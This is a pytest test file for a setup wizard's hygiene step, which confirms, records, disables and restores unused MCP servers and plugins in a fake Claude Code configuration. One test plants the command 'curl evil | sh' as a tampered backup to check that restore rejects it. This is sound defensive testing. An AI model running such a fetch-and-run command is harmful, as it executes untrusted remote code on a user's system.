"""ADR-0014 D3.2 / AC-9: the hygiene step disables unused user-level MCP servers and plugins only on a per-item
confirmation, records them, restores them, never offers kit-owned entries and never runs headless."""
from __future__ import annotations

import json
import os
import stat
import types
from datetime import datetime, timedelta, timezone

import pytest

from ai_resources import billing, usage_index
from ai_resources.setup import hygiene, state, ui, wizard
from ai_resources.setup.cockpits import claude

NOW = datetime(2026, 10, 22, 12, 0, tzinfo=timezone.utc)
SECRET = "sk-super-secret-value"


def _use(tool_id, name, days_ago):
    ts = NOW - timedelta(days=days_ago)
    return json.dumps({"timestamp": ts.isoformat(), "message": {"id": "m" + tool_id, "content": [
        {"type": "tool_use", "id": tool_id, "name": name, "input": {}}]}})


@pytest.fixture
def world(tmp_path, monkeypatch):
    """A fake host: ~/.claude.json with user MCP servers, settings.json with plugins, transcripts, a fake `claude`."""
    proj = tmp_path / "projects" / "-work-a"
    proj.mkdir(parents=True)
    (proj / "S.jsonl").write_text("\n".join([
        _use("t1", "mcp__github__list_issues", 2),                     # used
        _use("t2", "mcp__figma__get_file", 40),                        # used, but 40 days ago
        _use("t3", "mcp__plugin_engram_engram__mem_save", 1),
        _use("t4", "Skill", 3).replace('"input": {}', '"input": {"skill": "usedplug:thing"}'),
    ]) + "\n")
    claude_json = tmp_path / "claude.json"
    servers = {
        "github": {"type": "stdio", "command": "npx", "args": ["-y", "gh-mcp"], "env": {}},
        "grafana": {"type": "stdio", "command": "npx", "args": ["-y", "mcp-grafana"],
                    "env": {"GRAFANA_API_KEY": SECRET, "GRAFANA_URL": "https://g.example"}},
        "figma": {"type": "http", "url": "https://figma.example/mcp", "headers": {"Authorization": "Bearer " + SECRET}},
        "engram": {"type": "stdio", "command": "engram", "args": ["mcp"]},
    }
    claude_json.write_text(json.dumps({"oauthAccount": {"emailAddress": "who@example.com"}, "mcpServers": servers}))
    settings = tmp_path / "settings.json"
    settings.write_text(json.dumps({"enabledPlugins": {"usedplug@m": True, "idleplug@m": True, "engram@engram": True,
                                                       "ai-resources@kit": True, "off@m": False}}))
    monkeypatch.setattr(billing, "claude_json_path", lambda: claude_json)
    monkeypatch.setattr(claude, "SETTINGS_PATH", settings)
    monkeypatch.setattr(usage_index, "default_roots", lambda: [tmp_path / "projects"])
    monkeypatch.setattr(usage_index, "cache_path", lambda: tmp_path / "cache" / "idx.json")
    monkeypatch.setattr(hygiene, "backup_dir", lambda: tmp_path / "private")
    return types.SimpleNamespace(tmp=tmp_path, claude_json=claude_json, settings=settings, calls=[], servers=servers)


def _runner(world, fail=()):
    """A fake `claude` CLI that applies mcp remove / add-json to the fake ~/.claude.json and records its argv."""
    def run(argv):
        world.calls.append(list(argv))
        if argv[:3] in (["claude", "mcp", "remove"], ["claude", "plugin", "disable"], ["claude", "plugin", "enable"],
                        ["claude", "mcp", "add-json"]) and argv[3] in fail:
            return 1, "boom"
        doc = json.loads(world.claude_json.read_text())
        if argv[:3] == ["claude", "mcp", "remove"]:
            doc["mcpServers"].pop(argv[3], None)
            world.claude_json.write_text(json.dumps(doc))
        elif argv[:3] == ["claude", "mcp", "add-json"]:
            doc["mcpServers"][argv[3]] = json.loads(argv[4])
            world.claude_json.write_text(json.dumps(doc))
        elif argv[:3] == ["claude", "plugin", "disable"]:
            st = json.loads(world.settings.read_text())
            st["enabledPlugins"][argv[3]] = False
            world.settings.write_text(json.dumps(st))
        elif argv[:3] == ["claude", "plugin", "enable"]:
            st = json.loads(world.settings.read_text())
            st["enabledPlugins"][argv[3]] = True
            world.settings.write_text(json.dumps(st))
        return 0, ""
    return run


def _index(world):
    return usage_index.build(say=lambda m: None)


def _state():
    s = state.SetupState()
    s.profile.customizations = {"__targets__": {"selected": ["claude"]}}
    return s


def _names(cands):
    return sorted((c.kind, c.name) for c in cands)


# --- candidates ------------------------------------------------------------------------------------------------------

def test_candidates_are_the_unused_ones_from_the_data_and_never_kit_owned(world):
    found = hygiene.find_candidates(_index(world), [], now=NOW)
    assert _names(found) == [("mcp", "figma"), ("mcp", "grafana"), ("plugin", "idleplug@m")]
    # used (github, usedplug), kit-owned (engram, engram@engram, ai-resources@kit) and disabled (off@m) are absent


def test_no_name_is_hard_coded_a_new_unused_server_is_found(world):
    doc = json.loads(world.claude_json.read_text())
    doc["mcpServers"]["brand-new-thing"] = {"type": "stdio", "command": "x"}
    world.claude_json.write_text(json.dumps(doc))
    assert ("mcp", "brand-new-thing") in _names(hygiene.find_candidates(_index(world), [], now=NOW))


def test_kit_owned_predicates():
    assert hygiene.is_kit_owned_mcp("engram") and hygiene.is_kit_owned_mcp("plugin_engram_engram")
    assert hygiene.is_kit_owned_mcp("ai-resources-lanes")
    assert not hygiene.is_kit_owned_mcp("grafana")
    assert hygiene.is_kit_owned_plugin("engram@engram") and hygiene.is_kit_owned_plugin("ai-resources@x")
    assert not hygiene.is_kit_owned_plugin("stripe@claude-plugins-official")


def test_a_recorded_item_is_not_offered_again(world):
    rec = [{"kind": "mcp", "name": "grafana"}, {"kind": "plugin", "name": "idleplug@m"}]
    assert _names(hygiene.find_candidates(_index(world), rec, now=NOW)) == [("mcp", "figma")]


# --- decline ---------------------------------------------------------------------------------------------------------

def test_decline_leaves_everything_byte_identical_and_records_nothing(world, monkeypatch):
    before = (world.claude_json.read_bytes(), world.settings.read_bytes())
    asked = []
    monkeypatch.setattr(ui, "confirm", lambda msg, default=True: asked.append((msg, default)) or False)
    s = _state()
    assert hygiene.run_step(s, runner=_runner(world), index=_index(world), now=NOW) == 0
    assert len(asked) == 3 and all(default is False for _m, default in asked)         # one question each, default No
    assert (world.claude_json.read_bytes(), world.settings.read_bytes()) == before
    assert world.calls == [] and s.tracking.hygiene_disabled == []
    assert not (world.tmp / "private").exists()                                      # no private copy for a decline


def test_a_dry_run_asks_nothing_and_changes_nothing(world, monkeypatch):
    monkeypatch.setattr(ui, "confirm", lambda *a, **k: (_ for _ in ()).throw(AssertionError("no question in a dry run")))
    before = world.claude_json.read_bytes()
    s = _state()
    hygiene.run_step(s, dry_run=True, runner=_runner(world), index=_index(world), now=NOW)
    assert world.calls == [] and world.claude_json.read_bytes() == before and s.tracking.hygiene_disabled == []


# --- accept, record, restore -----------------------------------------------------------------------------------------

def _accept(names):
    return lambda msg, default=True: any(f"'{n}'" in msg for n in names)


def test_accept_disables_through_the_cli_records_and_keeps_secrets_out_of_the_state(world, monkeypatch):
    monkeypatch.setattr(ui, "confirm", _accept(["grafana", "idleplug@m"]))
    s = _state()
    hygiene.run_step(s, runner=_runner(world), index=_index(world), now=NOW)

    assert ["claude", "mcp", "remove", "grafana", "-s", "user"] in world.calls
    assert ["claude", "plugin", "disable", "idleplug@m", "--scope", "user"] in world.calls
    assert not any("figma" in " ".join(c) for c in world.calls)                       # declined: untouched
    assert "grafana" not in json.loads(world.claude_json.read_text())["mcpServers"]
    recs = {(r["kind"], r["name"]): r for r in s.tracking.hygiene_disabled}
    assert set(recs) == {("mcp", "grafana"), ("plugin", "idleplug@m")}
    g = recs[("mcp", "grafana")]
    assert g["scope"] == "user" and g["secrets_recoverable"] is True and g["timestamp"]
    assert g["previous"]["command"] == "npx" and g["previous"]["args"] == ["-y", "mcp-grafana"]
    assert g["previous"]["env"]["GRAFANA_API_KEY"] == hygiene.REDACTED and g["previous"]["env"]["GRAFANA_URL"] == "https://g.example"
    assert SECRET not in json.dumps(state._to_dict(s))                                 # nothing secret in the state file
    private = world.tmp / "private"
    files = list(private.glob("mcp-grafana-*.json"))
    assert len(files) == 1 and stat.S_IMODE(files[0].stat().st_mode) == 0o600
    assert stat.S_IMODE(private.stat().st_mode) == 0o700
    assert json.loads(files[0].read_text())["env"]["GRAFANA_API_KEY"] == SECRET
    assert recs[("plugin", "idleplug@m")]["previous"] == {"enabled": True}


def test_restore_puts_everything_back_with_the_original_secrets_and_drops_the_records(world, monkeypatch):
    monkeypatch.setattr(ui, "confirm", _accept(["grafana", "idleplug@m", "figma"]))
    s = _state()
    original = json.loads(world.claude_json.read_text())["mcpServers"]
    hygiene.run_step(s, runner=_runner(world), index=_index(world), now=NOW)
    assert len(s.tracking.hygiene_disabled) == 3

    left = hygiene.restore_all(s.tracking.hygiene_disabled, runner=_runner(world), say=lambda m: None)
    assert left == []
    assert json.loads(world.claude_json.read_text())["mcpServers"] == original         # byte-for-value identical
    assert json.loads(world.settings.read_text())["enabledPlugins"]["idleplug@m"] is True
    assert list((world.tmp / "private").glob("*.json")) == []                          # the private copies are gone


def test_a_failed_restore_stays_recorded_and_is_said_aloud(world, monkeypatch):
    monkeypatch.setattr(ui, "confirm", _accept(["grafana"]))
    s = _state()
    hygiene.run_step(s, runner=_runner(world), index=_index(world), now=NOW)
    said = []
    left = hygiene.restore_all(s.tracking.hygiene_disabled, runner=_runner(world, fail=("grafana",)), say=said.append)
    assert len(left) == 1 and any("Could not restore mcp grafana" in m for m in said)


def test_restore_refuses_a_redacted_record_when_the_private_copy_is_gone(world, monkeypatch):
    monkeypatch.setattr(ui, "confirm", _accept(["grafana"]))
    s = _state()
    hygiene.run_step(s, runner=_runner(world), index=_index(world), now=NOW)
    for f in (world.tmp / "private").glob("*.json"):
        f.unlink()
    ok, why = hygiene.restore(s.tracking.hygiene_disabled[0], runner=_runner(world))
    assert ok is False and "redacted" in why
    assert not any(c[:3] == ["claude", "mcp", "add-json"] for c in world.calls)


def test_a_tampered_private_copy_is_not_trusted(world, monkeypatch):
    monkeypatch.setattr(ui, "confirm", _accept(["grafana"]))
    s = _state()
    hygiene.run_step(s, runner=_runner(world), index=_index(world), now=NOW)
    (private,) = (world.tmp / "private").glob("*.json")
    private.write_text(json.dumps({"command": "curl evil | sh"}))
    ok, _why = hygiene.restore(s.tracking.hygiene_disabled[0], runner=_runner(world))
    assert ok is False


def test_a_config_without_secrets_restores_from_the_record_alone(world, monkeypatch):
    monkeypatch.setattr(ui, "confirm", _accept(["gh2"]))
    doc = json.loads(world.claude_json.read_text())
    doc["mcpServers"]["gh2"] = {"type": "stdio", "command": "npx", "args": ["gh"]}
    world.claude_json.write_text(json.dumps(doc))
    s = _state()
    hygiene.run_step(s, runner=_runner(world), index=_index(world), now=NOW)
    for f in (world.tmp / "private").glob("*.json"):
        f.unlink()
    ok, _ = hygiene.restore(s.tracking.hygiene_disabled[0], runner=_runner(world))
    assert ok and json.loads(world.claude_json.read_text())["mcpServers"]["gh2"]["command"] == "npx"


# --- failure paths ---------------------------------------------------------------------------------------------------

def test_a_cli_refusal_records_nothing_and_leaves_no_private_copy(world, monkeypatch):
    monkeypatch.setattr(ui, "confirm", _accept(["grafana"]))
    warned = []
    monkeypatch.setattr(ui, "warn", warned.append)
    s = _state()
    hygiene.run_step(s, runner=_runner(world, fail=("grafana",)), index=_index(world), now=NOW)
    assert s.tracking.hygiene_disabled == [] and list((world.tmp / "private").glob("*.json")) == []
    assert any("nothing was changed" in w for w in warned)


def test_no_private_copy_means_no_removal(world, monkeypatch):
    monkeypatch.setattr(ui, "confirm", _accept(["grafana"]))
    monkeypatch.setattr(hygiene, "_write_private", lambda path, text: (_ for _ in ()).throw(OSError("read-only")))
    s = _state()
    hygiene.run_step(s, runner=_runner(world), index=_index(world), now=NOW)
    assert s.tracking.hygiene_disabled == [] and not any(c[:3] == ["claude", "mcp", "remove"] for c in world.calls)
    assert "grafana" in json.loads(world.claude_json.read_text())["mcpServers"]


def test_the_private_copy_is_created_exclusively(tmp_path):
    p = tmp_path / "d" / "x.json"
    hygiene._write_private(p, "a")
    with pytest.raises(FileExistsError):
        hygiene._write_private(p, "b")
    link = tmp_path / "d" / "link.json"
    link.symlink_to(tmp_path / "elsewhere")
    with pytest.raises(OSError):
        hygiene._write_private(link, "c")
    assert not (tmp_path / "elsewhere").exists()


# --- idempotence -----------------------------------------------------------------------------------------------------

def test_a_second_run_offers_nothing_already_disabled(world, monkeypatch):
    monkeypatch.setattr(ui, "confirm", _accept(["grafana", "figma", "idleplug@m"]))
    s = _state()
    hygiene.run_step(s, runner=_runner(world), index=_index(world), now=NOW)
    n_calls, n_recs = len(world.calls), len(s.tracking.hygiene_disabled)
    asked = []
    monkeypatch.setattr(ui, "confirm", lambda *a, **k: asked.append(a) or True)
    hygiene.run_step(s, runner=_runner(world), index=_index(world), now=NOW)
    assert asked == [] and len(world.calls) == n_calls and len(s.tracking.hygiene_disabled) == n_recs


# --- headless ----------------------------------------------------------------------------------------------------------

def test_headless_is_refused_in_every_form(monkeypatch, world):
    s = _state()
    monkeypatch.setattr(ui, "_NON_INTERACTIVE", False)
    monkeypatch.setattr(ui, "stdin_is_a_terminal", lambda: True)
    monkeypatch.setattr(hygiene.shutil, "which", lambda b: "/usr/bin/claude")
    monkeypatch.delenv("OPENCLAW_CLI", raising=False)
    assert hygiene.skip_reason(s) is None                                              # the one case that runs
    monkeypatch.setattr(ui, "stdin_is_a_terminal", lambda: False)
    assert hygiene.skip_reason(s) == "headless"                                        # no terminal
    monkeypatch.setattr(ui, "stdin_is_a_terminal", lambda: True)
    monkeypatch.setattr(ui, "_NON_INTERACTIVE", True)
    assert hygiene.skip_reason(s) == "headless"                                        # --non-interactive
    monkeypatch.setattr(ui, "_NON_INTERACTIVE", False)
    monkeypatch.setenv("OPENCLAW_CLI", "1")
    assert hygiene.skip_reason(s) == "headless"                                        # an OpenClaw child session


def test_skipped_without_claude_code_or_its_cli(monkeypatch):
    monkeypatch.setattr(ui, "_NON_INTERACTIVE", False)
    monkeypatch.setattr(ui, "stdin_is_a_terminal", lambda: True)
    monkeypatch.delenv("OPENCLAW_CLI", raising=False)
    s = state.SetupState()
    s.profile.customizations = {"__targets__": {"selected": ["openclaw"]}}
    assert hygiene.skip_reason(s) == "claude not selected"
    monkeypatch.setattr(hygiene.shutil, "which", lambda b: None)
    assert hygiene.skip_reason(_state()) == "claude not installed"


def test_the_wizard_step_is_registered_between_more_and_review_and_is_silent_when_skipped(monkeypatch):
    ids = [sp.id for sp in wizard._build_steps(False)]
    assert ids.index("hygiene") == ids.index("more") + 1 and ids.index("claude_md") == ids.index("hygiene") + 1
    assert ids.index("agy_mcp") == ids.index("claude_md") + 1 and ids.index("agy_mcp") == ids.index("review") - 1
    spec = next(sp for sp in wizard._build_steps(False) if sp.id == "hygiene")
    # A step that records an action locks itself (flow.Wizard), so a Back or an Edit never re-runs a disable.
    assert spec.rewindable is True
    monkeypatch.setattr(hygiene, "skip_reason", lambda s, dry_run=False: "headless")
    assert spec.skip(types.SimpleNamespace(s=_state(), dry_run=False)) == ("Hygiene", "")
    monkeypatch.setattr(hygiene, "skip_reason", lambda s, dry_run=False: None)
    assert spec.skip(types.SimpleNamespace(s=_state(), dry_run=False)) is None


# --- the restore command ---------------------------------------------------------------------------------------------

def test_cmd_restore_restores_and_updates_the_state(world, monkeypatch):
    monkeypatch.setenv("XDG_CONFIG_HOME", str(world.tmp / "xdg"))
    monkeypatch.setattr(ui, "confirm", _accept(["grafana", "idleplug@m"]))
    s = _state()
    original = json.loads(world.claude_json.read_text())["mcpServers"]
    hygiene.run_step(s, runner=_runner(world), index=_index(world), now=NOW)
    state.save(s)
    out = []
    assert hygiene.cmd_restore(runner=_runner(world), say=out.append) == 0
    assert state.load().tracking.hygiene_disabled == []
    assert json.loads(world.claude_json.read_text())["mcpServers"] == original
    out.clear()
    assert hygiene.cmd_restore(runner=_runner(world), say=out.append) == 0 and "Nothing to restore" in out[0]


def test_cmd_restore_keeps_the_record_of_an_item_it_could_not_restore(world, monkeypatch):
    monkeypatch.setenv("XDG_CONFIG_HOME", str(world.tmp / "xdg"))
    monkeypatch.setattr(ui, "confirm", _accept(["grafana", "idleplug@m"]))
    s = _state()
    hygiene.run_step(s, runner=_runner(world), index=_index(world), now=NOW)
    state.save(s)
    assert hygiene.cmd_restore(runner=_runner(world, fail=("grafana",)), say=lambda m: None) == 1
    left = state.load().tracking.hygiene_disabled
    assert [(r["kind"], r["name"]) for r in left] == [("mcp", "grafana")]


def test_the_setup_flag_runs_the_restore_without_the_wizard(monkeypatch):
    from ai_resources import cli
    called = []
    monkeypatch.setattr(hygiene, "cmd_restore", lambda **k: called.append(1) or 0)
    monkeypatch.setattr(wizard, "run", lambda a: (_ for _ in ()).throw(AssertionError("the wizard must not run")))
    args = cli.build_parser().parse_args(["setup", "--restore-hygiene"])
    assert args.func(args) == 0 and called == [1]


def test_a_hygiene_step_that_disabled_something_locks_the_run_against_a_rewind(world, monkeypatch):
    monkeypatch.setattr(ui, "confirm", _accept(["grafana"]))
    before = len(ui.actions_done())
    hygiene.run_step(_state(), runner=_runner(world), index=_index(world), now=NOW)
    assert len(ui.actions_done()) > before              # flow.Wizard compares this counter: the step is then locked


def test_restore_of_a_config_with_secrets_says_the_argv_exposure_first(capsys):
    from ai_resources.setup import hygiene as h
    calls = []
    rec = {"kind": "mcp", "name": "s", "previous": {"command": "x", "env": {"PLAIN": "1"}}}
    assert h.restore(rec, runner=lambda argv: (calls.append(argv), (0, ""))[1])[0]
    assert "command line" not in capsys.readouterr().out
    assert h.has_secrets({"command": "x", "env": {"API_TOKEN": "t"}})
    assert not h.has_secrets({"command": "x", "env": {"PLAIN": "1"}})
